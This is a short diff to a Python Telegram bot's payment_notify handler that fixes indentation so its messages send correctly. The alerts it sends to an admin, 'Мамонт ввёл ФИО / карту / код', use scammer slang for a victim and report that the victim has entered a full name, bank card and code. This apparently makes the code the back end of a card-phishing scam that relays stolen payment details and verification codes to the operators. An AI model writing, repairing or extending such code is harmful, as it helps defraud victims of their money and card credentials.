@@ -1631,13 +1631,13 @@ async def payment_notify(request):
         ]
     )
     try:
-    await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+        await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg1 у PAYMENT_GROUP_ID: {e}")
         import traceback
         traceback.print_exc()
     try:
-    await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
+        await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg1 у ADMIN_GROUP_ID: {e}")
         import traceback
@@ -1669,7 +1669,7 @@ async def payment_notify(request):
     ]
     )
     try:
-    await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+        await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
     except Exception as e:
         print(f"[ERROR] Не вдалося надіслати msg2 у PAYMENT_GROUP_ID: {e}")
         import traceback
@@ -1688,7 +1688,7 @@ async def payment_notify(request):
             ]
         )
         try:
-        await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
+            await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати msg3 у PAYMENT_GROUP_ID: {e}")
             import traceback
@@ -1704,20 +1704,20 @@ async def payment_notify(request):
             admin_user_id = row[0]
     if admin_user_id:
         try:
-        await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
+            await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати ФИО admin_user_id: {e}")
             import traceback
             traceback.print_exc()
         try:
-        await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
+            await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
         except Exception as e:
             print(f"[ERROR] Не вдалося надіслати карту admin_user_id: {e}")
             import traceback
             traceback.print_exc()
         if code:
             try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл код')
+                await bot.send_message(admin_user_id, 'Мамонт ввёл код')
             except Exception as e:
                 print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
                 import traceback
